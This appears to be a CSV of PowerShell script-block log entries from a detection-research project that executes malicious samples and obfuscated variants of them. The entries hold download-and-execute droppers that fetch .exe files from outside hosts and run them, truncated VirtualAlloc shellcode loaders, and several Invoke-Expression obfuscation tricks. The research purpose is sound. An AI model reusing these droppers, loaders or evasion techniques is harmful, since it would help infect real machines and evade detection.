"8/6/2026 10:19:23 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:19:23 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:19:23 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1588.ps1","2238","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:19:15 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:19:15 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:19:15 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:19:15 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:19:15 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:19:15 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1588.ps1","2802"," ((""{32}{29}{2}{15}{35}{45}{9}{1}{28}{0}{24}{18}{41}{44}{37}{3}{10}{21}{27}{20}{46}{40}{30}{14}{16}{5}{42}{22}{19}{23}{43}{12}{6}{8}{4}{7}{13}{17}{11}{36}{34}{33}{25}{26}{31}{39}{38}"" -f 'emberDefinit"
"8/6/2026 10:19:07 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:19:07 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:19:07 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:19:07 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:19:06 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:19:06 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1588.ps1","2651","InVoke-eXpRESSiON( (('apMc = LT3[DllImport(NeHkernel32.dllNeH)]public static extern IntPtr Vir'+'tualAlloc(IntPtr lpAddress, uint dwSize'+', uint flAlloca'+'tionType, uint flProtect);[Dll'+'Import(NeH"
"8/6/2026 10:18:58 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:18:58 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:18:58 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:18:58 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:18:58 AM","","2233"," $c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr "
"8/6/2026 10:18:58 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1588.ps1","9851"," & ( $EnV:comSpeC[4,26,25]-join'')("" $( set-ITEM  'VaRIable:OfS'  '')""+ [StrinG][ChaR[]](36, 99,32 ,61,32,39,91,68 ,108, 108, 73 , 109 ,112,111 ,114, 116 , 40, 34 ,107 , 101 , 114, 110 ,101,108,51 ,50"
"8/6/2026 10:18:50 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:18:50 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:18:50 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:18:50 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:18:50 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1588.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:18:43 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:18:43 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:18:43 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:18:43 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:18:43 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1585.ps1","127","(N`e`W-`objeCt System.Net.WebClient).DownloadFile('https://1fichier.com/?hfshjhm0yf','mess.exe');ST`A`RT-pR`oce`ss 'mess.exe'
"
"8/6/2026 10:18:35 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:18:35 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:18:35 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:18:35 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:18:35 AM","","118","(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?hfshjhm0yf','mess.exe');Start-Process 'mess.exe'"
"8/6/2026 10:18:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1585.ps1","410"," (((""{10}{25}{8}{3}{23}{15}{7}{17}{20}{6}{4}{1}{22}{24}{14}{11}{5}{12}{13}{16}{9}{18}{2}{19}{21}{0}"" -f'rocess HKtmess.exeHKt','tps://1','K','Net','oadFile(HKtht','yf','wnl','Cli','stem.','.ex','(New-"
"8/6/2026 10:18:27 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:18:27 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:18:27 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:18:27 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:18:27 AM","","118","(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?hfshjhm0yf','mess.exe');Start-Process 'mess.exe'"
"8/6/2026 10:18:27 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1585.ps1","257",". ( $SHeLlid[1]+$shELliD[13]+'X') ((('(New-Object Sys'+'te'+'m.Net'+'.'+'Web'+'Client)'+'.Downlo'+'ad'+'Fi'+'le({0}ht'+'tps:'+'//'+'1fichier.com/?'+'hfshj'+'hm0yf{'+'0'+'},{0}mes'+'s.e'+'xe'+'{0});S'+"
"8/6/2026 10:18:19 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:18:19 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:18:19 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:18:19 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:18:19 AM","","118","(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?hfshjhm0yf','mess.exe');Start-Process 'mess.exe'"
"8/6/2026 10:18:19 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1585.ps1","18","{([cHAr][inT] $_)}"
"8/6/2026 10:18:19 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1585.ps1","519"," ( '40@78G101&119i45U79-98S106&101@99U116i32-83%121U115S116<101&109&46@78i101&116&46i87-101@98S67%108@105<101%110@116G41-46G68i111-119@110@108S111%97U100<70U105-108&101i40%39S104S116d116@112%115G58G47"
"8/6/2026 10:18:11 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:18:11 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:18:11 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:18:11 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:18:11 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1585.ps1","118","(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?hfshjhm0yf','mess.exe');Start-Process 'mess.exe'"
"8/6/2026 10:18:03 AM","","9","$global:?"
"8/6/2026 10:18:03 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:18:03 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:18:03 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:18:03 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:18:03 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1579.ps1","148","(new`-OBJ`EcT System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',""$env:TEMP\Pa_001.exe"");S`T`Art-Pro`cesS (""$env:TEMP\Pa_001.exe"")
"
"8/6/2026 10:17:56 AM","","9","$global:?"
"8/6/2026 10:17:55 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:17:55 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:17:55 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:17:55 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:17:55 AM","","141","(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',""$env:TEMP\Pa_001.exe"");Start-Process (""$env:TEMP\Pa_001.exe"")"
"8/6/2026 10:17:55 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1579.ps1","543",".((GET-vaRIaBLE '*mDr*').nAmE[3,11,2]-joIn'') ((((""{16}{0}{32}{9}{10}{4}{24}{31}{21}{38}{2}{30}{26}{15}{23}{35}{28}{40}{14}{19}{17}{18}{3}{5}{36}{34}{27}{1}{25}{20}{6}{22}{13}{41}{29}{11}{8}{37}{12}{3"
"8/6/2026 10:17:48 AM","","9","$global:?"
"8/6/2026 10:17:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:17:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:17:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:17:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:17:48 AM","","141","(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',""$env:TEMP\Pa_001.exe"");Start-Process (""$env:TEMP\Pa_001.exe"")"
"8/6/2026 10:17:48 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1579.ps1","465","Iex((('(Ne'+'w-'+'Ob'+'je'+'ct S'+'yst'+'em.Net.WebCli'+'ent)'+'.Do'+'wnlo'+'a'+'dF'+'ile(BZKhttp://nikil.tk'+'/p1'+'/P'+'a_'+'0'+'01'+'.exeBZK,mq'+'bws9en'+'v'+':TEM'+'PwZx'+'Pa_001.ex'+'emqb);Start-"
"8/6/2026 10:17:40 AM","","9","$global:?"
"8/6/2026 10:17:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:17:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:17:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:17:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:17:40 AM","","141","(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',""$env:TEMP\Pa_001.exe"");Start-Process (""$env:TEMP\Pa_001.exe"")"
"8/6/2026 10:17:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1579.ps1","24","{( [iNt]$_ -aS [chAr]) }"
"8/6/2026 10:17:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1579.ps1","593","[STRiNG]::jOin('',('40e78;101e119A45z79e98,106Q101<99b116,32&83;121e115e116e101b109b46Q78&101<116Q46&87Q101,98b67<108;105<101,110e116b41A46&68z111!119&110e108e111z97;100z70,105z108Q101&40,39&104b116A1"
"8/6/2026 10:17:32 AM","","9","$global:?"
"8/6/2026 10:17:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:17:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:17:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:17:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:17:32 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1579.ps1","141","(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',""$env:TEMP\Pa_001.exe"");Start-Process (""$env:TEMP\Pa_001.exe"")"
"8/6/2026 10:17:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:17:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:17:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:17:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:17:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1532.ps1","2326","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:17:17 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:17:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:17:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:17:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:17:16 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:17:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1532.ps1","2886","(((""{26}{29}{31}{13}{19}{18}{11}{47}{7}{38}{37}{40}{44}{20}{0}{1}{24}{6}{21}{2}{33}{4}{8}{48}{12}{41}{16}{34}{27}{25}{46}{42}{14}{10}{5}{32}{23}{45}{43}{39}{17}{30}{28}{3}{15}{35}{9}{22}{36}""-f'p','e "
"8/6/2026 10:17:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:17:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:17:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:17:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:17:08 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:17:08 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1532.ps1","2761","('Acnc = NBq[DllImport(42Wkernel32.dll42'+'W)]public static extern IntPtr'+' VirtualAlloc(IntPtr lpAddress, uint d'+'wSize, uint flAllocationType, u'+'int flProte'+'ct);[DllImport(42Wkernel32.dll42W)]"
"8/6/2026 10:17:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:17:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:17:00 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:17:00 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:17:00 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:17:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1532.ps1","24","{( [INt] $_ -As [cHAr])}"
"8/6/2026 10:17:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1532.ps1","10189","-JOiN ( ( 36 , 99,32, 61 , 32, 39 , 91,68 ,108 ,108,73, 109 , 112,111 , 114 ,116 , 40,34 ,107,101,114 ,110 , 101 , 108, 51, 50 , 46,100 ,108, 108 , 34, 41, 93 , 112,117, 98 ,108, 105,99 , 32, 115 ,116"
"8/6/2026 10:16:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:16:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:16:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:16:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:16:52 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1532.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:16:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:16:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:16:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:16:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:16:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1530.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:16:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:16:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:16:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:16:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:16:36 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:16:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1530.ps1","2812","((""{19}{33}{0}{3}{5}{30}{4}{25}{10}{26}{15}{40}{31}{23}{41}{22}{14}{46}{45}{8}{28}{6}{35}{36}{2}{43}{13}{39}{11}{34}{38}{7}{12}{42}{24}{32}{9}{20}{21}{16}{27}{44}{17}{1}{29}{18}{37}"" -f'e',');qm8i++) "
"8/6/2026 10:16:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:16:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:16:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:16:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:16:28 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:16:28 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1530.ps1","2664"," & ( $ShelLid[1]+$shELLId[13]+'x') (('f9uc = i74[DllImport(3xCkernel32.dll3xC)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport"
"8/6/2026 10:16:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:16:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:16:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:16:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:16:20 AM","","2232","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:16:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1530.ps1","23","{( [INT] $_ -as[CHAr])}"
"8/6/2026 10:16:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1530.ps1","9809",".( $psHomE[21]+$PShOme[34]+'X')(""$(seT-ITem 'vArIABLe:Ofs' '')"" + [StrINg]( (36,99, 32,61,32, 39, 91, 68,108 , 108,73, 109,112 ,111,114, 116 ,40, 34,107 , 101 , 114 , 110 , 101 , 108 , 51 ,50 ,46 , 10"
"8/6/2026 10:16:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:16:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:16:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:16:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:16:12 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1530.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:16:04 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:16:04 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:16:04 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:16:04 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:16:04 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1524.ps1","2328","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:15:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:15:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:15:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:15:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:15:56 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:15:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1524.ps1","2902","& ( ([strinG]$VErBOSEPreFeRence)[1,3]+'X'-JoIn'') (((""{30}{5}{41}{9}{37}{22}{14}{11}{21}{19}{27}{0}{23}{48}{31}{47}{8}{45}{42}{12}{43}{16}{40}{44}{33}{7}{32}{25}{24}{3}{2}{28}{13}{15}{10}{39}{20}{1}{4"
"8/6/2026 10:15:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:15:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:15:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:15:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:15:48 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:15:48 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1524.ps1","2750"," & ((vAriaBLE '*mdR*').NAme[3,11,2]-jOIN'') ( ('HaNc = Uwd[DllImport(ebdkernel32.dllebd)'+']pu'+'blic static extern IntPtr VirtualAlloc('+'IntPtr lpAddress, ui'+'nt dwSize, uint flAllocationTyp'+'e, u"
"8/6/2026 10:15:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:15:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:15:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:15:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:15:40 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:15:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1524.ps1","23","{ ([Int] $_ -as[chAr])}"
"8/6/2026 10:15:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1524.ps1","7919","[STrinG]::jOin('' , ( '36U99~32U61E32_39~91E68U108D108m73U109U112D111_114_116U40D34R107~101T114R110m101~108T51D50E46R100R108o108~34U41@93m112o117o98@108E105m99U32@115D116T97T116E105D99m32o101m120m116_"
"8/6/2026 10:15:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:15:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:15:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:15:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:15:32 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1524.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:15:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:15:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:15:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:15:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:15:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1514.ps1","2337","$Ega = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:15:16 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:15:16 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:15:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:15:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
